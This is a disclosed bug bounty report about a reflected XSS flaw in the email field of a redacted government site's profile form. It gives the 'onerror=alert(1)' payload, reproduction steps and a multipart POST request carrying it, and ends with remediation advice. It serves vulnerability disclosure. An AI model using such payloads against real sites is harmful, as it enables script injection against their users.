# Reflected XSS - in Email Input

## Report Details
- **Report ID**: 799839
- **URL**: https://hackerone.com/reports/799839
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-02-19T14:58:54.843Z
- **Disclosed**: 2022-03-18T19:01:11.951Z

## Reporter
- **Username**: ahmd_halabi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Target Url**
https://█████

**Summary:**
Hello, I found a reflected xss injection in the email input when updating user profile. Seems Email input is not sanitized and the special characters are not encoded.

**xss payload used**
"><img src=x onerror=alert(1);>

## Step-by-step Reproduction Instructions

1. Navigate to the target url `https://███/█████/` and login.
2. Then go to `My Profile`.
3. Set any password. In Email input, add the payload next to the email.
Example `your_email@gmail.com"><img src=x onerror=alert(1);>`
Then click save.

See this POST Request
```
POST /██████/edit_profile/ HTTP/1.1
Host: ████████

REQUEST HEADER HERE

-----------------------------191691572411478
Content-Disposition: form-data; name="action"

save_info
-----------------------------191691572411478
Content-Disposition: form-data; name="password[original]"

NEWPASSWORD
-----------------------------191691572411478
Content-Disposition: form-data; name="password[confirmed]"

NEWPASSWORD
-----------------------------191691572411478
Content-Disposition: form-data; name="email[original]"

███████"><img src=x onerror=alert(1);>
-----------------------------191691572411478--
```
And an Alert will pop up ;)
█████████

## Suggested Mitigation/Remediation Actions
Sanitize input fields or encode/escape special characters to avoid xss.

## Impact

An attacker can execute malicious javascript codes on the target application.

Hope this is not duplicate :|

## Attachments
No attachments
